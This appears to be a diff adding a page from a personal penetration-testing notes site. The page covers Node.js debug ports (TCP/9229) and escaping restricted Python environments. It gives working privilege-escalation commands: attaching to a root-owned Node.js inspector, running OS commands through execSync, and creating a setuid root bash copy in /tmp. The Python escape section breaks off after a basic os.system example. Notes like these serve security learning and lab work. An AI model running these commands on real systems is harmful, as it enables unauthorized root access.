@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
+        <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
+    <script src="/H4ckV4ult/styles/prism/prism.js"></script>
+    <title>Minimalist Webpage</title>
+
+</head>
+<body>
+    <div id="navbar-container"></div>
+    <script src="/H4ckV4ult/components/navbar.js"></script>
+
+    <div class="notion-container">
+        <div class="notion-header">
+            <h1>NodeJS (TCP/9229)</h1>
+            <p>Node.js® is a free, open-source, cross-platform JavaScript runtime environment that lets developers create servers, web apps, command line tools and scripts</p>
+        </div>
+        <div class="notion-body">
+
+            <h2>Privilege escalation</h2>
+            <ul>
+                <p>When nodejs is started with the <b>--inspect</b> switch, a Node.js process listens for a debugging client. By default, it will listen at host and port 127.0.0.1:9229. Each process is also assigned a unique UUID. An example of nodejs runing like said is:</p>
+                <pre><code class="language-bash">root        1328  0.0  1.1 1066456 46380 ?       Ssl  09:26   0:01 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js</code></pre>
+                <p>We can access the console by typing</p>
+                <pre><code class="language-bash">node inspect 127.0.0.1:9229</code></pre>
+                <p>Once inside we can use the following command to execute any OS command and since the nodejs is running as root the command will be executed as a superuser</p>
+                <pre><code class="language-bash">debug> exec("process.mainModule.require('child_process').execSync('whoami').toString()")</code></pre>
+                <p>Or we can use</p>
+                <pre><code class="language-bash">debug> exec("process.mainModule.require('child_process').execSync('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash').toString()")
+/tmp/rootbash -p</code></pre>
+                
+            </ul>
+
+            <h2>Escape from restricted environment (Python IDE)</h2>
+            <ul>
+            <p>In some cases you may find that you are in a python environment that ables you to run commands but not all of them. The current case was a python IDE that was web hosted, in that case you could try several things</p>
+            <h3>Introductory</h3>
+            <p>We could try some very basic way of executing commands. This is likely not work since there will be some restricted words</p>
+            <pre><code class="language-python">import os
+os.system("whoami")</code></pre>
+            
+            
+
+        </ul>
+
+        </div>
+    </div>
+
+
+</body>
+</html>
